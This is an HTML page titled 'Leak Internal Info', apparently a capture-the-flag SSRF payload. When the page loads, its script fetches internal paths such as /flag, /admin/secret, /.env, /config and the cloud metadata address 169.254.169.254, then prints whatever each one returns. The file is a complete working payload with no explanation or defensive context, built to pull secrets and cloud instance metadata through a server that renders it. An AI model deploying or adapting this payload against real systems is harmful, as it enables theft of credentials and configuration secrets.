<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Leak Internal Info</title>
</head>
<body>
  <h1>Collecting sensitive info...</h1>
  <pre id="output"></pre>

  <script>
    const endpoints = [
      "/flag",
      "/admin/secret",
      "/.env",
      "/config",
      "http://169.254.169.254/latest/meta-data/"
    ];

    const output = document.getElementById("output");

    async function leak() {
      for (const url of endpoints) {
        try {
          const res = await fetch(url);
          if (res.ok) {
            const text = await res.text();
            output.textContent += `=== ${url} ===\n${text}\n\n`;
          } else {
            output.textContent += `=== ${url} ===\nFailed with status: ${res.status}\n\n`;
          }
        } catch (e) {
          output.textContent += `=== ${url} ===\nError: ${e.message}\n\n`;
        }
      }
    }

    leak();
  </script>
</body>
</html>
